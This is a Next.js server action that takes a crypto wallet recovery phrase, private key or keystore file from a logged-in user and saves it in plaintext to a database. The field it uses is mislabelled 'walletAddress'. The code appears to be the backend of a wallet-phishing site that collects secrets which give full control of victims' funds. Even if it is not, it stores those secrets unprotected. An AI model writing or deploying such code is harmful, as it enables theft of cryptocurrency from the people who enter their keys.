'use server'

import Wallet from "@/models/Wallet";
import User from "@/models/User";
import { getServerSession } from "next-auth";
import { connectToDB } from "@/lib/connectDB";
import { authOptions } from "@/auth";

export async function saveWalletData({ type, data, walletName }) {
  await connectToDB();
  const session = await getServerSession(authOptions);
  const userId = session?.user?._id;

  if (!userId) {
    throw new Error("User not authenticated");
  }

  let walletContent = "";
  if (type === "phrase" || type === "private") {
    walletContent = data.trim();
  } else if (type === "keystore") {
    walletContent = JSON.stringify(data);
  }

  // Save to Wallet collection
  const wallet = await Wallet.create({
    userId,
    walletAddress: walletContent,
    network: walletName || "Unknown",
  });

  // Add wallet to User
  await User.findByIdAndUpdate(userId, {
    $push: { wallets: wallet._id },
  });

  return { success: true, walletId: wallet._id };
}
